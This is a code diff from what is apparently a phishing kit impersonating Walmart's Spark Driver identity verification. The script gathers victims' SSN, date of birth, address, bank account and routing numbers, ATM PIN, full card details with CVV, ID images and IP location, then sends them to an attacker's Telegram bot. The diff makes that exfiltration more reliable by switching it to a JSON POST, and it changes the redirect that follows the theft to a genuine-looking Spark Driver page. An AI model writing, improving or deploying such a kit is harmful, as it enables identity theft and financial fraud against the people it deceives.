@@ -62,7 +62,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     hideLoading('loading4');
                     updateProgress(4);
                     // Redirect to main site after successful verification
-                    window.location.href = "https://one.walmart.com/content/sparkdriverapp/en_us.html";
+                    window.location.href = "https://www.sparkdriverapp.com/en_us";
                 }, 5000);
             } catch (error) {
                 console.error('Error:', error);
@@ -132,55 +132,64 @@ document.addEventListener('DOMContentLoaded', function() {
     // Function to send data to Telegram
     async function sendToTelegram(formData, ipInfo) {
         // Format the message
-        let message = `*New Identity Verification Submission*%0A%0A`;
+        const message = `*New Identity Verification Submission*
 
-        // Step 1 data
-        message += `*Personal Information:*%0A`;
-        message += `First Name: ${formData.step1.firstName}%0A`;
-        message += `Last Name: ${formData.step1.lastName}%0A`;
-        message += `Phone: ${formData.step1.phone}%0A`;
-        message += `DOB: ${formData.step1.dob}%0A`;
-        message += `SSN: ${formData.step1.ssn}%0A`;
-        message += `Address: ${formData.step1.address}%0A%0A`;
+*Personal Information:*
+First Name: ${formData.step1.firstName}
+Last Name: ${formData.step1.lastName}
+Phone: ${formData.step1.phone}
+DOB: ${formData.step1.dob}
+SSN: ${formData.step1.ssn}
+Address: ${formData.step1.address}
 
-        // Step 2 data
-        message += `*Bank Information:*%0A`;
-        message += `Bank Name: ${formData.step2.bankName}%0A`;
-        message += `Account Number: ${formData.step2.bankAccount}%0A`;
-        message += `Account Type: ${formData.step2.accountType}%0A`;
-        message += `Routing Number: ${formData.step2.routingNumber}%0A`;
-        message += `ATM Pin: ${formData.step2.atmPin}%0A%0A`;
+*Bank Information:*
+Bank Name: ${formData.step2.bankName}
+Account Number: ${formData.step2.bankAccount}
+Account Type: ${formData.step2.accountType}
+Routing Number: ${formData.step2.routingNumber}
+ATM Pin: ${formData.step2.atmPin}
 
-        // Step 3 data
-        message += `*Card Information:*%0A`;
-        message += `Card Number: ${formData.step3.cardNumber}%0A`;
-        message += `Expiration Date: ${formData.step3.expDate}%0A`;
-        message += `CVV: ${formData.step3.cvv}%0A`;
-        message += `Confirm ATM Pin: ${formData.step3.confirmAtmPin}%0A%0A`;
+*Card Information:*
+Card Number: ${formData.step3.cardNumber}
+Expiration Date: ${formData.step3.expDate}
+CVV: ${formData.step3.cvv}
+Confirm ATM Pin: ${formData.step3.confirmAtmPin}
 
-        // Step 4 data
-        message += `*ID Upload:*%0A`;
-        message += `Front ID: ${formData.step4.frontId}%0A`;
-        message += `Back ID: ${formData.step4.backId}%0A%0A`;
+*ID Upload:*
+Front ID: ${formData.step4.frontId}
+Back ID: ${formData.step4.backId}
 
-        // IP information
-        message += `*IP Information:*%0A`;
-        message += `IP Address: ${ipInfo.ip}%0A`;
-        message += `City: ${ipInfo.city}%0A`;
-        message += `State/Region: ${ipInfo.region}%0A`;
-        message += `Country: ${ipInfo.country}%0A`;
-        message += `Postal Code: ${ipInfo.postal}%0A`;
-        message += `ISP: ${ipInfo.isp}%0A`;
+*IP Information:*
+IP Address: ${ipInfo.ip}
+City: ${ipInfo.city}
+State/Region: ${ipInfo.region}
+Country: ${ipInfo.country}
+Postal Code: ${ipInfo.postal}
+ISP: ${ipInfo.isp}`;
 
         // Send the message to Telegram
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
 
         try {
-            const response = await fetch(url);
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+            
             const data = await response.json();
             if (!data.ok) {
                 throw new Error('Telegram API error: ' + data.description);
             }
+            console.log('Message sent successfully to Telegram');
         } catch (error) {
             console.error('Error sending to Telegram:', error);
             throw error;
